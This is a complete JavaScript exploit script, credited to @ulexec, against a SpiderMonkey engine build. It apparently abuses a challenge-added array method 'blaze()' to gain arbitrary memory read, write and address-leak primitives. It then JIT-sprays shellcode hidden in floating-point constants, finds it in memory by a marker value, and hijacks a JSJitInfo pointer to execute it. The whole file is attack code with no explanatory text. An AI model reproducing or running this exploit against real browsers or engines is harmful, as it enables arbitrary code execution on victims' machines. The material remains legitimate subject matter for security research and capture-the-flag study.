// Exploit by @ulexec for SpiderMonkey JavaScript-C90.0a1 - 23-04-2021

load('utils.js');
load('int64.js');
load('resolver.js');
 
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function arb_write(addr, value, size) {
	function arb_w1(addr, value) {
		x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
		y = new Uint8Array(8);
		x.blaze();
		save = x[13];
		x[13] = itof(addr)
		y[0] = Number(value);
		x[13] = save;
	}

	value = BigInt(value);
	for (var i = 0; i < size; i ++) {
		v = BigInt(value & 0xffn);
		arb_w1(addr+BigInt(i), v);
		value = value >> 8n;
	}
}

function arb_read(addr, size) {
	function arb_r1(addr) {
		var a1 = new Array(1, 2, 3, 4);
		var a2 = new Uint8Array(8);
		a1.blaze();
	
		a1[13] = itof(addr)
		return a2.slice(0, 1)[0];
	}

	let pointer = 0n;

	if (size == 8)
		size = 6;

	for (var i = 0n; i < BigInt(size); i++) {
		pointer += BigInt(arb_r1(addr + i)) << (8n * i);
	}
	return pointer;
}

function addrof(obj) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();	
	a1[14] = obj;
	return a2.slice(0, 8);
}

// Full RELRO Exploitaion abusing JIT engine
// Use constants to JIT shellcode
function shellcode(){
	find_me = 5.40900888e-315; // 0x41414141 flag in memory
	A = -6.828527034422786e-229;
	B = 8.568532312320605e+170;
	C = 1.4813365150669252e+248;
	D = -6.032447120847604e-264;
	E = -6.0391189260385385e-264;
	F = 1.0842822352493598e-25;
	G = 9.241363425014362e+44;
	H = 2.2104256869204514e+40;
	I = 2.4929675059396527e+40;
	J = 3.2459699498717e-310;
	K = 1.637926e-318;
}

// Searches from the JIT memory region to find the shellcode's flag 0x41414141
function find_shellcode_addr(addr) {
	while(true) { 
		let val = arb_read(addr, 4); 
		if(val == 0x41414141n) {
			addr = addr + 8n;
			return addr;
		}
		addr = addr + 1n;
	}
}

// JIT shellcode function
for(i=0;i<0x10000;i++) shellcode();

// Get Shellcode address
let shellcode_object = BigInt(Int64.fromJSValue(addrof(shellcode)));
let shellcode_jitinfo_ptr = arb_read(shellcode_object+0x28n, 8);
let shellcode_jitinfo = arb_read(shellcode_jitinfo_ptr, 8);
let shellcode_entry = find_shellcode_addr(shellcode_jitinfo);

console.log("[+] shellcode Object :\t\t0x"+shellcode_object.toString(16));
console.log("[+] shellcode JSJitInfo ptr:\t0x"+shellcode_jitinfo_ptr.toString(16));
console.log("[+] shellcode JSJitInfo:\t0x"+shellcode_jitinfo.toString(16));
console.log("[+] shellcode entry:\t\t0x"+shellcode_entry.toString(16));

// Overwritting jitinfo ptr with jit shellcode address
arb_write(shellcode_jitinfo_ptr, shellcode_entry, 8);

// This is for debuging purposes
Math.atan2(shellcode);
// Shellcode will call JSJitInfo ptr which we have overwritten
shellcode();

